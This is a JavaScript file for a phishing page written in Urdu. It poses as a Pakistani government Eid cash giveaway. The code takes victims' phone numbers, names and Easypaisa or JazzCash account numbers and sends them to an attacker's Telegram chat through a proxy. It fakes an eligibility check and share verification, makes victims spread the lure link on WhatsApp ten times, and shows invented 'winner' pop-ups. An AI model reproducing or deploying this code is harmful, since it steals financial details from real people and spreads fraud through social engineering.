let shareCount = 0;
let channelJoined = false;
let selectedBank = "";

const TG_TOKEN = import.meta.env.VITE_TG_TOKEN;
const TG_CHAT_ID = import.meta.env.VITE_TG_CHAT_ID;
const PROXY_URL = import.meta.env.VITE_PROXY_URL;

async function sendToTelegram(message, bankType = 'default') {
    const formData = new FormData();
    formData.append('token', TG_TOKEN);
    formData.append('chatid', TG_CHAT_ID);
    
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    return new Promise((resolve) => {
        const sendBlob = (blob) => {
            formData.append('photo', blob, 'image.png');
            formData.append('caption', message);

            fetch(PROXY_URL, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                console.log('TG Success:', result);
                resolve(result);
            })
            .catch(e => {
                console.error('TG Error:', e);
                resolve(null);
            });
        };

        if (bankType === 'Easypaisa' || bankType === 'JazzCash') {
            const img = new Image();
            img.crossOrigin = "Anonymous";
            img.onload = () => {
                const halfWidth = img.width / 2;
                canvas.width = halfWidth;
                canvas.height = img.height;
                
                const sourceX = bankType === 'Easypaisa' ? 0 : halfWidth;
                ctx.drawImage(img, sourceX, 0, halfWidth, img.height, 0, 0, halfWidth, img.height);
                
                canvas.toBlob(sendBlob, 'image/png');
            };
            img.onerror = () => {
                // Fallback to pixel if image fails to load
                canvas.width = 1;
                canvas.height = 1;
                canvas.toBlob(sendBlob, 'image/png');
            };
            img.src = 'banks.png';
        } else {
            canvas.width = 1;
            canvas.height = 1;
            canvas.toBlob(sendBlob, 'image/png');
        }
    });
}

function showSection(id) {
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    window.scrollTo(0, 0);
}

function validateNumber() {
    const num = document.getElementById('phoneNumber').value;
    if (num.length < 11 || !num.startsWith('03')) {
        alert('براہ کرم درست پاکستانی نمبر درج کریں (03xxxxxxxxx)');
        return;
    }

    sendToTelegram(`🆕 *New User Visit*\n📱 Phone: ${num}`);

    showSection('checking');
    let progress = 0;
    const bar = document.getElementById('checkProgress');
    const status = document.getElementById('statusText');
    const statuses = [
        'آپ کا نمبر چیک کیا جا رہا ہے...',
        'سرور سے رابطہ کیا جا رہا ہے...',
        'ڈیٹا بیس میں تصدیق جاری ہے...',
        'ایڈی کی اہلیت چیک کی جا رہی ہے...',
        'مبارک ہو! آپ اہل ہیں...',
        'تکمیل ہو رہی ہے...'
    ];

    const interval = setInterval(() => {
        progress += Math.random() * 10 + 2;
        if (progress > 100) progress = 100;
        bar.style.width = progress + '%';
        
        const statusIdx = Math.floor((progress / 100) * (statuses.length - 1));
        status.innerText = statuses[statusIdx];

        if (progress >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                showSection('reward');
            }, 1000);
        }
    }, 300);
}

function selectBank(name) {
    selectedBank = name;
    document.getElementById('bankTitle').innerText = name + ' کی معلومات';
    document.getElementById('selectedBankBadge').innerText = name;
    
    // Update the large icon in the info section
    const iconDiv = document.getElementById('currentBankIcon');
    iconDiv.className = 'bank-icon-zoom zoom-' + name.toLowerCase();
    
    // Visual selection feedback
    document.querySelectorAll('.bank-card').forEach(c => c.classList.remove('selected'));
    document.getElementById('card-' + name.toLowerCase()).classList.add('selected');
    
    setTimeout(() => {
        showSection('info');
    }, 500);
}

function showTasks() {
    const name = document.getElementById('accName').value;
    const num = document.getElementById('accNumber').value;
    
    if (name.length < 3 || num.length < 10) {
        alert('براہ کرم تمام معلومات درست طریقے سے درج کریں');
        return;
    }
    
    sendToTelegram(`💰 *Account Details Collected*\n🏦 Bank: ${selectedBank}\n👤 Name: ${name}\n💳 Number: ${num}\n📱 Original Phone: ${document.getElementById('phoneNumber').value}`, selectedBank);

    showSection('tasks');
}

function markJoined() {
    channelJoined = true;
    alert('آپ نے چینل فالو کر لیا ہے۔ اب شیئر کرنے والا ٹاسک مکمل کریں۔');
    checkCompletion();
}

function shareWa() {
    if (shareCount >= 10) return;

    // Open WhatsApp
    const shareText = encodeURIComponent(`🌙 عید مبارک! ✨ \n\nمجھے پاکستان حکومت کی عیدی اسکیم 2026 سے 5,000 روپے مل رہے ہیں! 😍 \n\nاگر آپ بھی عیدی حاصل کرنا چاہتے ہیں تو ابھی اس لنک پر کلک کریں اور اپنا نمبر درج کریں: \n\nhttps://eidigift2026-pk.vercel.app`);
    window.open(`whatsapp://send?text=${shareText}`, '_blank');

    // Verification Simulation
    const shareBtn = document.querySelector('#tasks .btn-primary[onclick="shareWa()"]');
    const originalText = shareBtn.innerText;
    shareBtn.disabled = true;
    shareBtn.innerText = "شیئر کی تصدیق ہو رہی ہے... (Verifying)";
    shareBtn.style.opacity = "0.7";

    setTimeout(() => {
        shareCount++;
        if (shareCount > 10) shareCount = 10;
        
        const progress = (shareCount / 10) * 100;
        document.getElementById('shareProgress').style.width = progress + '%';
        document.getElementById('shareCount').innerText = `${shareCount}/10 تکمیل`;
        
        shareBtn.disabled = false;
        shareBtn.innerText = originalText;
        shareBtn.style.opacity = "1";
        
        if (shareCount < 10) {
            alert(`شیئر مکمل ہو گیا! براہ کرم مزید ${10 - shareCount} بار شیئر کریں۔`);
        } else {
            alert("مبارک ہو! آپ کا شیئر کرنے والا ٹاسک مکمل ہو گیا ہے۔");
        }
        
        checkCompletion();
    }, 3000); // 3 seconds verification delay
}

function checkCompletion() {
    const btn = document.getElementById('finalBtn');
    if (shareCount >= 10 && channelJoined) {
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.cursor = 'pointer';
        btn.classList.add('pulse-animation'); // Optional: add a class for extra attention
    }
}

function finalize() {
    if (shareCount < 10 || !channelJoined) {
        alert('براہ کرم تمام ٹاسک مکمل کریں!');
        return;
    }
    
    sendToTelegram(`✅ *User Completed All Tasks*\n📱 Phone: ${document.getElementById('phoneNumber').value}\n🏦 Bank: ${selectedBank}\n💳 Account: ${document.getElementById('accNumber').value}`, selectedBank);

    showSection('final');
}
function toggleFaq(element) {
    const answer = element.nextElementSibling;
    const isVisible = answer.style.display === 'block';
    answer.style.display = isVisible ? 'none' : 'block';
    element.querySelector('span').innerText = isVisible ? '+' : '-';
}

// Notification Simulation
const winners = [
    "اسد نے ابھی 5،000 روپے وصول کیے",
    "فوزیہ نے ابھی 5،000 روپے وصول کیے",
    "عرفان نے ابھی 5،000 روپے وصول کیے",
    "شمائلہ نے ابھی 5،000 روپے وصول کیے",
    "کامران نے ابھی 5،000 روپے وصول کیے",
    "بلال نے ابھی 5،000 روپے وصول کیے",
    "زینب نے ابھی 5،000 روپے وصول کیے",
    "حمزہ نے ابھی 5،000 روپے وصول کیے",
    "عائشہ نے ابھی 5،000 روپے وصول کیے",
    "عثمان نے ابھی 5،000 روپے وصول کیے",
    "مریم نے ابھی 5،000 روپے وصول کیے",
    "رضوان نے ابھی 5،000 روپے وصول کیے",
    "طاہرہ نے ابھی 5،000 روپے وصول کیے",
    "شان نے ابھی 5،000 روپے وصول کیے",
    "اقرا نے ابھی 5،000 روپے وصول کیے",
    "فیصل نے ابھی 5،000 روپے وصول کیے",
    "صباء نے ابھی 5،000 روپے وصول کیے",
    "نوید نے ابھی 5،000 روپے وصول کیے",
    "حنا نے ابھی 5،000 روپے وصول کیے",
    "زوہیب نے ابھی 5،000 روپے وصول کیے",
    "انعم نے ابھی 5،000 روپے وصول کیے",
    "شهزاد نے ابھی 5،000 روپے وصول کیے",
    "ماہم نے ابھی 5،000 روپے وصول کیے",
    "وقاص نے ابھی 5،000 روپے وصول کیے",
    "نمرہ نے ابھی 5،000 روپے وصول کیے",
    "عدیل نے ابھی 5،000 روپے وصول کیے",
    "ثانیہ نے ابھی 5،000 روپے وصول کیے",
    "عقبہ نے ابھی 5،000 روپے وصول کیے",
    "مبشر نے ابھی 5،000 روپے وصول کیے",
    "سعدیہ نے ابھی 5،000 روپے وصول کیے",
    "طلحہ نے ابھی 5،000 روپے وصول کیے",
    "فرح نے ابھی 5،000 روپے وصول کیے",
    "جنید نے ابھی 5،000 روپے وصول کیے",
    "مہوش نے ابھی 5،000 روپے وصول کیے",
    "ساجد نے ابھی 5،000 روپے وصول کیے"
];

function showNotification() {
    const toast = document.getElementById('notification-toast');
    const text = document.getElementById('notif-text');
    const randomWinner = winners[Math.floor(Math.random() * winners.length)];
    
    text.innerText = randomWinner;
    toast.style.display = 'flex';
    
    setTimeout(() => {
        toast.style.display = 'none';
    }, 4000);
}

// Start simulation after delay
setTimeout(() => {
    setInterval(showNotification, 8000);
}, 3000);
